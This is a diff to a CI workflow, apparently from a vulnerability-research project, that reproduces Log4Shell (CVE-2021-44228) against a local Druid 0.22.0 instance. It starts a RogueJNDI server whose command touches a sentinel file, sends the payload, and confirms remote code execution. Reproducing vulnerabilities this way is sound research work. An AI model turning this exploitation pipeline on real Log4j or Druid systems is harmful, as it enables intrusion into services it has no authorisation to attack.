@@ -147,12 +147,12 @@ jobs:
         run: |
           # Use loopback; Druid runs on the same host so it can reach the HTTP server.
           java -jar rq1/rogue-jndi-server/target/RogueJndi-1.1.jar \
-            --command "touch /tmp/log4shell_pwned" \
+            --command "touch log4shell_pwned" \
             --hostname 127.0.0.1 \
-            > /tmp/rogue-jndi.log 2>&1 &
+            > rogue-jndi.log 2>&1 &
           sleep 3
           echo "RogueJNDI log:"
-          cat /tmp/rogue-jndi.log
+          cat rogue-jndi.log
 
       - name: Send Log4Shell payload to Druid
         run: python3 rq1/trigger_log4shell.py --host http://localhost:8888
@@ -163,13 +163,15 @@ jobs:
       - name: Confirm RCE — check sentinel file
         run: |
           echo "=== RogueJNDI log ==="
-          cat /tmp/rogue-jndi.log
+          cat rogue-jndi.log
           echo ""
-          if [ -f /tmp/log4shell_pwned ]; then
-            echo "✓ RCE CONFIRMED: /tmp/log4shell_pwned exists"
+          if [ -f log4shell_pwned ]; then
+            ls -l .
+            echo "✓ RCE CONFIRMED: log4shell_pwned exists"
             echo "  Druid 0.22.0 with log4j-core 2.8.2 is fully exploitable via CVE-2021-44228"
           else
-            echo "✗ Sentinel file not found — exploitation did not complete"
+            ls -l .
+            echo "✗ log4shell_pwned not found — exploitation did not complete"
             exit 1
           fi
 
